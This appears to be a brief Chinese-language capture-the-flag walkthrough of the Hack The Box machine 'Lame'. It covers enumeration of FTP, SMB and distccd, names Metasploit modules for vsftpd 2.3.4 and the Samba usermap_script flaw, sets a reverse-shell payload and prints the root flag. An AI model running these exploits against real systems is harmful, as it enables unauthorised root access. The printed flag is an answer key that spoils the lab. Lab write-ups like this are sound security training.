# Lame

> victim: 10.10.10.3
>
> local: 10.10.14.9

通过扫描结果，可以推测出目标大致为Ubuntu系统

## FTP (21)

可以匿名登录，但没有文件

vsftpd 2.3.4

版本低，EDB找到：https://www.exploit-db.com/exploits/17491

```
exploit/unix/ftp/vsftpd_234_backdoor
```

失败

## SMB (139&445)

```bash
smbclient -L 10.10.10.3 -U "guest"%''
```

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

3.0.20-Debian 低版本，EDB找到：https://www.exploit-db.com/exploits/16320

```rb
exploit/multi/samba/usermap_script
```

```shell
set payload cmd/unix/reverse_socat_udp
```

直接就是root，秒了

## distccd(3632)

一个非常见协议，应该着重关注

尝试直接连接

```
nc 10.10.10.3 3632
```
## root.txt
```
92caac3be140ef409e45721348a4e9df
```

